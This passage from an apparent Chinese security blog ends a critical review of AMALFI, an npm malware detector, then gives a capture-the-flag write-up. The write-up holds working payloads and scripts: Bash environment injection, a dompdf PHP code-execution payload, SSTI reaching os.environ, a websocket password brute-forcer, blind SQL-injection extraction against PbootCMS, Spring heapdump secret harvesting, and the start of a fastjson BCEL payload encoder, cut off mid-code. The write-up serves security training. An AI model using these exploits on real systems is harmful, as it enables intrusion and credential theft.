href="#0x023-Classifier-trainning" class="headerlink" title="0x023 Classifier trainning"></a>0x023 Classifier trainning</h3><p>æ®è¯»è€…å…ˆå‰çš„ç ”ç©¶ï¼ŒNPMåˆ é™¤çš„åŒ…æ˜¯ä¸å­˜åœ¨ç¼“å­˜çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æ²¡æœ‰ä»»ä½•é€”å¾„å†ä»å®˜æ–¹çš„æºä¸­ä¸‹è½½åˆ°ã€‚ä½œè€…çš„æ¶æ„åŒ…æ˜¯æ‰¾NPMç´¢å–çš„ã€‚åœ¨ç´¢è¦åˆ°çš„643ä¸ªæ¶æ„åŒ…çš„åŸºç¡€ä¸Šï¼Œä½œè€…å¢åŠ äº†1147ä¸ªåŒä¸€æ—¥æœŸå‘å¸ƒçš„æ­£å¸¸åŒ…ï¼Œæ„æˆäº†ä¸€ä¸ªæ€»é‡ä¸º1790çš„å¸¦æ ‡ç­¾è¯­æ–™åº“ï¼ˆé¢˜å¤–è¯ï¼Œè¿™ä¸ªè¯­æ–™åº“çš„é‡å¯¹äºåœ¨å½“æ—¶å•ç‰ˆæœ¬å°±æœ‰170wä¸ªåŒ…çš„æ€»æ•°æ®é‡æ˜¯å¦æœ‰äº›å°äº†ï¼Œä½†åœ¨è¿™ä¸ªé¢†åŸŸæ ·æœ¬å·®è·ä¹Ÿæ˜¯æ— å¯å¥ˆä½•çš„ğŸ˜£</p><p>ä¹Ÿæ­£æ˜¯ä¸ºäº†è§£å†³æ ·æœ¬çš„æåº¦ä¸å¹³è¡¡æ€§ï¼Œä½œè€…æœ€åé”å®šäº†ä¸‰ä¸ªç®—æ³•ï¼šå†³ç­–æ ‘ã€æœ´ç´ è´å¶æ–¯åˆ†ç±»å™¨å’Œä¸€åˆ†ç±»SVMã€‚<br>å†³ç­–æ ‘èƒ½å¾ˆå¥½åœ°è¯´æ˜ç‰¹å¾é‡è¦æ€§ï¼Œåä¸¤è€…ä¸»è¦æ˜¯è§£å†³æ ·æœ¬ä¸å¹³è¡¡é—®é¢˜ã€‚æ–‡ç« ä¸­å€¼å¾—æ³¨æ„çš„æ˜¯åœ¨è®­ç»ƒä¸€åˆ†ç±»SVMæ—¶ï¼Œä½œè€…è®¾å®švå‚çš„å€¼ä¸º0.001ï¼Œè¿™ä¸ªå‚æ•°æœ‰ç‚¹ç±»ä¼¼é¢„æœŸå¼‚å¸¸ç‚¹ï¼ˆå¹¶ä¸æ˜¯verboseï¼‰ã€‚è¿™æ„å‘³1000ä¸ªåŒ…çš„ç‰ˆæœ¬ä¸­å­˜åœ¨ç€ä¸€ä¸ªæ¶æ„ç‰ˆæœ¬ã€‚ä½†å®é™…ä¸Šï¼Œä½œè€…æè¿°åˆ°å…¶åœ¨è®­ç»ƒä¸€åˆ†ç±»SVMæ—¶ä½¿ç”¨çš„éƒ½æ˜¯æ­£å¸¸ç‰ˆæœ¬çš„åŒ…ã€‚å…³äºè¿™ä¸€ç‚¹ï¼Œè¯»è€…åœ¨è‡ªå·±ç ”ç©¶çš„æ—¶å€™ä¹Ÿæ³¨æ„åˆ°äº†è¿™ä¸€ç‚¹ï¼Œå³é¢„æœŸå¼‚å¸¸æ¦‚ç‡çš„è®¾å®šä¼šä¸¥é‡å½±å“åˆ°æ¨¡å‹ç²¾ç¡®åº¦ï¼Œè¿™é‡Œæ˜¯å€¼å¾—å¥½å¥½è€ƒè™‘çš„ä¸€ä¸ªç‚¹ã€‚ï¼ˆæŒ‰ä½œè€…çš„æ€è·¯ï¼Œå“ªæ€•è®­ç»ƒä½¿ç”¨çš„æ˜¯å…¨éƒ¨æ­£å¸¸çš„ç‰ˆæœ¬ï¼Œä¹Ÿéœ€è¦è®¾å®šä¸€ä¸ªæœ¬ä¸éœ€è¦çš„é¢„æœŸå¼‚å¸¸æ¦‚ç‡ã€‚è¯»è€…è®¤ä¸ºè¿™é‡Œçš„åšæ³•çš„ç¡®ä¸å¤ªåˆç†ï¼Œåº”å½“æ˜¯æŒ‰ç…§æ¯”ä¾‹æŠ•æ”¾å‡ ä¸ªå·²çŸ¥æ¶æ„åŒ…æ»¡è¶³é¢„å®šæ¯”ä¾‹ï¼Œä»¥æ­¤æ£€æŸ¥æ¨¡å‹æ€§èƒ½</p><h3 id="0x024-Reproducer-and-clone-detector"><a href="#0x024-Reproducer-and-clone-detector" class="headerlink" title="0x024 Reproducer and clone detector"></a>0x024 Reproducer and clone detector</h3><p>æ‰€è°“reproducerå°±æ˜¯æŒ‡ä»æºä»£ç é‡æ–°æ„å»ºç”Ÿæˆè½¯ä»¶åŒ…ã€‚å®é™…ä¸Šï¼Œä½œè€…ç§°ç¢äºå„ç§ç°å®åŸå› ï¼ˆæ²¡æœ‰æºä»£ç ä»“åº“ã€gitæäº¤è®°å½•å¯¹ä¸ä¸Šä¹‹ç±»ï¼‰ï¼Œå¾ˆå¤šæ­£å¸¸çš„åŒ…ä¹Ÿæ²¡åŠæ³•è¿˜åŸç”Ÿæˆï¼Œåªèƒ½ç®—ä½œæ˜¯ä¸€ä¸ªæ•ˆç‡ä¸é«˜çš„è¿‡æ»¤å™¨ã€‚clone detectorä¸»è¦æ˜¯è®¡ç®—åŒ…å†…æ–‡ä»¶çš„md5å€¼ï¼Œå¹¶ä¸å·²çŸ¥æ¶æ„åŒ…çš„å“ˆå¸Œå€¼åˆ—è¡¨è¿›è¡Œæ¯”è¾ƒã€‚è€ƒè™‘åˆ°åŒ…çš„å…·ä½“æƒ…å†µä¸åŒï¼Œä½œè€…å¿½ç•¥äº†åŒ…åå’Œç‰ˆæœ¬ã€‚ï¼ˆé¢˜å¤–è¯ï¼Œè¯»è€…è®¤ä¸ºé¦–å…ˆreproduceræ•ˆç‡æœ‰å¾…æ”¹è¿›ï¼Œä½œä¸ºä¸€ä¸ªç®€å•è¿‡æ»¤å™¨æ”¾åœ¨è¿™é‡Œæ²¡æœ‰é—®é¢˜ã€‚ä½†æ˜¯è¿™ä¸ªclone detectoråªå¿½ç•¥äº†åŒ…åå’Œç‰ˆæœ¬ï¼Œæ”»å‡»è€…ä¿®æ”¹æ–‡ä»¶ä¸­æ¶‰åŠçš„IOCsæˆ–æ˜¯éšæ„è°ƒæ•´ç¼–ç ä¸å°±èƒ½å¤Ÿç»•è¿‡äº†ä¹ˆï¼Œè¿™é‡Œçš„æ–¹æ³•è¯»è€…è®¤ä¸º<strong>ç›¸å½“ä¸ä¸¥è°¨</strong></p><h2 id="0x03-Conclusion"><a href="#0x03-Conclusion" class="headerlink" title="0x03 Conclusion"></a>0x03 Conclusion</h2><p>ä½œè€…æå‡ºäº†AMALFIï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨äºæ£€æµ‹æ¶æ„npmåŒ…çš„æ–¹æ³•ï¼ŒåŒ…æ‹¬äº†ä¸‰ä¸ªä¸»è¦éƒ¨ä»¶ï¼šä¸€ä¸ªåœ¨å·²çŸ¥æ¶æ„åŒ…å’Œæ­£å¸¸åŒ…çš„æ ·æœ¬ä¸Šè®­ç»ƒå‡ºçš„åˆ†ç±»å™¨ï¼›ä¸€ä¸ªç”¨äºä»æºä»£ç æ„å»ºåŒ…çš„é‡æ„å™¨ï¼›ä¸€ä¸ªç”¨äºæŸ¥æ‰¾å·²çŸ¥æ¶æ„åŒ…çš„æ£€æµ‹å™¨ã€‚</p><p>è¯»è€…å°ç»“ï¼Œè¯¥æ–‡æå‡ºçš„æ–¹æ³•å…¶å®æ²¡æœ‰æ»¡è¶³å…¶åœ¨æ–‡ç« å¼€å§‹æåˆ°çš„ä¸‰ä¸ªå‡†åˆ™ã€‚æ”¾å¼ƒäººå·¥å®¡æŸ¥å¹¶ä¸èƒ½è¯´æ˜è¯¥æ–¹æ³•è¡¨ç°æ›´ä½³ï¼Œå°±æ–‡ç« ä¸­è¡¨ç°å‡ºçš„ç§ç§ï¼Œå¾ˆéš¾ä¸ç›¸ä¿¡è¿™ç®—ä¸€ç§æ©è€³ç›—é“ƒçš„æƒ³æ³•ã€‚åˆ†ç±»å™¨ç»“åˆäº†å„ä¸ªç®—æ³•çš„ä¼˜ç‚¹æ˜¯å¾ˆä¸é”™çš„æ€è·¯ï¼Œä½†æœ¬è´¨ä¸Šè¿˜æ˜¯åœ¨åšä¸€ä¸ªå¼‚å¸¸æ£€æµ‹ï¼ˆä¸€åˆ†ç±»ï¼‰é—®é¢˜ï¼Œä½œè€…åœ¨è®¾ç½®ä¸€åˆ†ç±»SVMå‚æ•°æ—¶è®²åˆ°å…¶è®­ç»ƒä½¿ç”¨çš„éƒ½æ˜¯æ­£å¸¸ç‰ˆæœ¬çš„è½¯ä»¶åŒ…ï¼ˆæ²¡æœ‰æ»¡è¶³æ¯”ä¾‹çš„æ¶æ„æ ·æœ¬ï¼‰ï¼Œä½†å´å°†é¢„æœŸå¼‚å¸¸æ¦‚ç‡è®¾å®šä¸º0.001ï¼Œè¿™é‡Œé€»è¾‘ä¸Šæ˜¯è¯´ä¸é€šçš„ã€‚åŒæ—¶ï¼Œå”¯äºŒæ¨¡å‹è¾“å‡ºåçš„è¿‡æ»¤å™¨ï¼Œä¸€ä¸ªnot work wellï¼Œä¸€ä¸ªå–hashå€¼æ—¶ä¸ä¸¥è°¨æ˜“è¢«ç»•è¿‡ã€‚æ¢å¥è¯è¯´ï¼Œè¿‡æ»¤å™¨æ²¡æœ‰èµ·åˆ°ç›¸å¯¹æœ‰æ•ˆçš„ç»“æœï¼Œé‚£è¿™ä¸ªæœ€ç»ˆç»“æœæ˜¯å¦ç¬¦åˆç°å®æƒ…å†µæ˜¯éœ€è¦æ‰“ä¸€ä¸ªå¤§å¤§çš„é—®å·çš„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NPM </tag>
            
            <tag> Supply Chain Attack </tag>
            
            <tag> ICSE&#39;22 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NS - SCUCTF 2022</title>
      <link href="/2022/05/23/SCUCTF2022/"/>
      <url>/2022/05/23/SCUCTF2022/</url>
      
        <content type="html"><![CDATA[<blockquote><p>éš¾å¾—é‡æ–°å¼€å§‹æ‰“æ¯”èµ›ï¼Œä»æ ¡èµ›å¼€å§‹å¤å¥ç»ƒä¹ </p></blockquote><blockquote><p>ç®€ç®€å•å•è®°å½•ä¸‹</p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>èµ›é¢˜æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]?<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]:highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>===<span class="string">&#x27;inject&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Permission denied&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$lock</span> = call_user_func((<span class="variable">$_GET</span>[<span class="string">&#x27;Y&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;env&#x27;</span>]) &amp;&amp; <span class="variable">$lock</span> == <span class="string">&quot;Web_Dog&quot;</span> &amp;&amp; <span class="variable">$action</span> == <span class="string">&#x27;inject&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span>[<span class="string">&quot;env&quot;</span>] <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">        putenv(<span class="string">&quot;<span class="subst">&#123;$k&#125;</span>=<span class="subst">&#123;$v&#125;</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;snakin&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span>[<span class="string">&quot;env&quot;</span>] <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">        putenv(<span class="string">&quot;<span class="subst">&#123;$k&#125;</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªactionä¸å¡«ç•™ç©ºå°±è¡Œï¼Œç¬¬äºŒä¸ªå‚æ•°éœ€è¦fuzzä¸€ä¸‹å¾—åˆ°phpinfoå¯ä»¥è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">funcs = [<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> func in funcs:</span><br><span class="line">    resp = requests.get(url=<span class="string">&quot;http://localhost:8888/222.php?a=inject1&amp;Y=&quot;</span>+func)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;11111&quot;</span> in resp.text:</span><br><span class="line">        <span class="keyword">print</span>(func)</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰ä¸ªå‚æ•°æŒ‰<a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">Pç¥çš„åšå®¢</a>æ¥å­¦ä¹ ä¸‹ï¼Œæœ¬åœ°æµ‹è¯•æˆåŠŸï¼Œè¿œç¨‹å¤±è´¥äº†ï¼Œä½†flagåœ¨phpinfoé‡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Bash 4.4åŠä»¥ä¸Šï¼š env[BASH_FUNC_snakin%25%25]=() &#123; id; &#125;</span><br><span class="line">Bash 4.4ä»¥å‰ï¼šenv[BASH_FUNC_snakin()]=() &#123; id; &#125;</span><br><span class="line">éœ€æ³¨æ„&#123;&#125;å‘¨å›´çš„ç©ºæ ¼æ˜¯å¿…ä¸å¯å°‘çš„</span><br></pre></td></tr></table></figure><h2 id="export2html"><a href="#export2html" class="headerlink" title="export2html"></a>export2html</h2><p>URLè¾“å…¥htmlç”Ÿæˆpdfï¼Œçœ‹äº†ä¸‹æ˜¯phpçš„ï¼Œè”æƒ³åˆ°dompdfã€‚è¿™é‡Œä¸æ˜¯è€ƒçš„rceï¼Œè€Œæ˜¯å¦ä¸€ä¸ªå‚æ•°ï¼Œè§<a href="https://ghostasky.github.io/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/">åšæ–‡</a></p><p>payload: <code> &lt;script%20type=&quot;text/php&quot;&gt;system(&quot;cat%20/flag%20&gt;%20./flaaaaaa.txt&quot;);&lt;/script&gt;</code></p><h2 id="anya"><a href="#anya" class="headerlink" title="anya"></a>anya</h2><p>wsæš´ç ´ç™»å½•ï¼Œå¯†ç 221ï¼Œè„šæœ¬å¯ä»¥å‚è€ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">hello</span>(<span class="params">pass1</span>):</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(<span class="string">&quot;ws://*.*.*.*:23333/internal/ws&quot;</span>) <span class="keyword">as</span> websocket:</span><br><span class="line">        <span class="keyword">await</span> websocket.send(<span class="string">&quot;begin&quot;</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        <span class="keyword">await</span> websocket.send(<span class="string">&quot;user admin&quot;</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.send(<span class="string">&quot;pass &quot;</span>+pass1)</span><br><span class="line">        res = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;badpass&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">            <span class="built_in">print</span>(pass1,res)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="built_in">print</span>(pass1 + <span class="string">&quot;error &quot;</span>)</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">220</span>,<span class="number">100000</span>):</span><br><span class="line">        <span class="keyword">await</span> hello(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure><p>å°±æ˜¯æ•ˆç‡æ¯”è¾ƒä½å¾—åˆ†æ®µä¸€èµ·çœ‹çœ‹ï¼Œåç»­ç ”ç©¶ä¸‹wså†æ¥ä¼˜åŒ–</p><p>ç™»å½•åï¼ŒSSTIï¼Œè¿‡æ»¤äº†å¾ˆå¤š</p><p>payload: <code> &#123;&#123;get_flashed_messages[%22__globAls__%22.lower()][%22__buIltins__%22.lower()].__import__(%22os%22)[%22eNviron%22.lower()]&#125;&#125;</code></p><h1 id="RealWorld"><a href="#RealWorld" class="headerlink" title="RealWorld"></a>RealWorld</h1><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>/envä¿¡æ¯æ³„æ¼</p><p>å‚è€ƒ<a href="https://github.com/LandGrey/SpringBootVulExploit%EF%BC%8C%E8%8E%B7%E5%8F%96%E5%85%B6%E4%B8%AD%E7%9A%84SecretKey%EF%BC%8C%E4%B8%8B%E8%BD%BD/heapdump%EF%BC%8C%E6%89%A7%E8%A1%8COQL%E8%AF%AD%E5%8F%A5">https://github.com/LandGrey/SpringBootVulExploitï¼Œè·å–å…¶ä¸­çš„SecretKeyï¼Œä¸‹è½½/heapdumpï¼Œæ‰§è¡ŒOQLè¯­å¥</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;SecretKey&quot;))</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°SecretKeyå’ŒSecretIdç™»å½•tx ossï¼Œè·å–flag</p><h2 id="Make-nday-great-again-and-again"><a href="#Make-nday-great-again-and-again" class="headerlink" title="Make nday great again and again"></a>Make nday great again and again</h2><p>ç¬¬ä¸€æ­¥ï¼Œåˆ©ç”¨å‰å°æ³¨å…¥æ‹¿CFG_COOKIE_ENCODE</p><p>ç¬¬äºŒæ­¥ï¼Œè·Ÿç€<a href="https://www.anquanke.com/post/id/232823">æ–‡ç« </a>æ‰“åˆ°è¿›åå°</p><p>ç¬¬ä¸‰æ­¥ï¼ŒæŠŠé…ç½®æ–‡ä»¶ä¸­çš„DATA_CACHE_PREFIXæ‰“å›æ¥ï¼Œè®¡ç®—å‰ç¼€ï¼ŒGetshell</p><p>å‰ç¼€è®¡ç®—ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$path</span> == DATA_PATH) &#123; <span class="variable">$pre</span> = hash(<span class="string">&#x27;md4&#x27;</span>, <span class="string">&#x27;F17&#x27;</span> . C(<span class="string">&#x27;DATA_CACHE_PREFIX&#x27;</span>)) . <span class="string">&#x27;_&#x27;</span>; <span class="variable">$filename</span> = <span class="variable">$path</span> . <span class="variable">$pre</span> . <span class="variable">$name</span> . <span class="string">&#x27;.php&#x27;</span>; &#125; </span><br></pre></td></tr></table></figure><h2 id="ezCMS"><a href="#ezCMS" class="headerlink" title="ezCMS"></a>ezCMS</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å‚è€ƒhttps://gitcode.net/mirrors/mr-xn/Penetration_Testing_POC/-/blob/0392d19e857410ce03fe1979eaaa9843b2022a3a/books/PbootCMS%203.0.4%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.pdf</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://*.*.*.*:23333/index.php?p=search&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http://&#x27;</span>:<span class="string">&#x27;127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fetchName</span>(<span class="params">mode</span>):</span></span><br><span class="line">    char_dic = string.ascii_lowercase+string.digits+<span class="string">&quot;&#125;&#123;-_$&quot;</span></span><br><span class="line">    <span class="comment"># 617925=ay%, 5e=^</span></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;tab&#x27;</span>:</span><br><span class="line">        payload = <span class="string">&quot;SELECT DISTINCT 1 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA LIKE 0x70626f6f74636d73 AND TABLE_NAME NOT LIKE 0x617925 AND TABLE_NAME REGEXP 0x5e&quot;</span> </span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">&#x27;col&#x27;</span>:</span><br><span class="line">        payload = <span class="string">&quot;SELECT DISTINCT 1 FROM information_schema.COLUMNS WHERE TABLE_NAME LIKE 0x666c6167677a7a61 AND COLUMN_NAME REGEXP 0x5e&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">&#x27;flag&#x27;</span>:</span><br><span class="line">        payload = <span class="string">&quot;SELECT DISTINCT 1 FROM flaggzza WHERE flag REGEXP 0x5e736375&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> alpha <span class="keyword">in</span> char_dic:</span><br><span class="line">            <span class="comment"># for none to fetch</span></span><br><span class="line">            <span class="keyword">if</span> alpha == <span class="string">&quot;$&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> name</span><br><span class="line">            hex_s = binascii.b2a_hex(<span class="built_in">bytes</span>(alpha.encode(<span class="string">&#x27;utf-8&#x27;</span>))).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            tmp_p = payload + hex_s</span><br><span class="line">            data = &#123;<span class="string">&#x27;1&#x27;</span>: tmp_p&#125;</span><br><span class="line">            <span class="built_in">print</span>(data)</span><br><span class="line">            resp = requests.post(url=url, headers=headers, data=data, proxies=proxies)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;æœªæœç´¢åˆ°ä»»ä½•&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                payload += hex_s</span><br><span class="line">                name += alpha</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># time.sleep(0.5)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;table: &quot;+fetchName(&quot;tab&quot;)) # flaggzza</span></span><br><span class="line"><span class="comment"># print(&quot;column: &quot;+fetchName(&quot;col&quot;)) # flag</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag: &quot;</span>+fetchName(<span class="string">&quot;flag&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">BCELEncode.java</span><br><span class="line">/*</span><br><span class="line"> * javac -encoding GBK -g -XDignore.symbol.file BCELEncode.java</span><br><span class="line"> * java BCELEncode EvilCode.class</span><br><span class="line"> */</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line">public class BCELEncode</span><br><span class="line">&#123;</span><br><span class="line">    public static void main ( String[] argv ) throws Exception</span><br><span class="line">    &#123;</span><br><span class="line">        String  filename    = argv[0];</span><br><span class="line">        byte[]  buf         = Files.readAllBytes( ( new File( filename ) ).toPath() );</span><br><span class="line">        /*</span><br><span class="line">         * public static String encode(byte[] bytes, boolean compress)</span><br><span class="line">         */</span><br><span class="line">        String  str         = 